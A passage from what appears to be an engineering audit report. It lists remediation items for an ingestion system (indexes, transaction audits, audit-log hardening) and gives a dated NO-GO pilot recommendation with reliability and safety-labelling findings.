| 8 | Backfill drifted fingerprints and `CustomerScopeKey`; replace `Take(250)`; make the advisory-lock key branch-invariant; key reconciliation on content | R-ID-01, R-ID-04, R-REL-04, R-REL-06 | **before the pilot corpus loads** |
| 9 | Make `SourceOccurrenceId` mandatory in `IngestAsync`; fix the three collision call sites; give the email/manual doors durable failure rows | R-REL-03, R-REL-10 | |
| 10 | Audit the 26 unwrapped `BeginTransactionAsync` sites | R-REL-08 | recovers 7 dead jobs |
| 11 | Unique indexes on `("BusinessUnitId","ContentHash")`, `Quotes.QuoteNo`, `Shipments.ShipmentNo`, `RFQ.Rfqno`, `(CorpusId, InquiryNumber)`; fence `PostgresAdvisoryLease` | R-REL-05, R-REL-07, R-REL-09 | |
| 12 | Append-only trigger + grant revoke on `AgentAuditLogs`; hash-chain the audit tables; remove the 105 `ex.Message` returns; move migrations off the web process; neutralise CSV formula cells | R-SEC-07..R-SEC-12 | scheduled work |

---

# H. PILOT RECOMMENDATION FROM THIS WORKSTREAM

**NO-GO as of 2026-08-06**, on four charter §6 conditions, each with production or code evidence:

| Condition | Finding |
|---|---|
| Unrecoverable worker failure | R-REL-01 — one poisoned row halts ingestion for every tenant; no hardening since the incident |
| Silent loss | R-REL-02 (15 documents lost, reported as zero) and R-REL-03 (files 2..N dropped on three doors) |
| Broken revision lineage / duplicate corruption | R-ID-02 — an amendment can still become an unrelated new RFQ; **zero** revisions, duplicates or possible matches have ever been produced in production |
| Safety representation | R-SEC-01 — 30 customer documents labelled "Cleared" in green by an EICAR string matcher, with the render.yaml precondition already violated |

**Path to CONDITIONAL GO:** items 1–4 in §G, plus the R-ID-01 backfill (item 8) before the pilot corpus
is loaded, plus acceptance evidence for FR-RFQ-05 and FR-RFQ-06 per `02-current-state-rtm.md`. R-LIM-01
through R-LIM-05 must each be owned, mitigated and dated rather than carried silently.

No safety, tenant-isolation or cross-tenant-exposure blocker was found — that part of the system is
genuinely well built (§F), and this recommendation should not be read as doubting it.
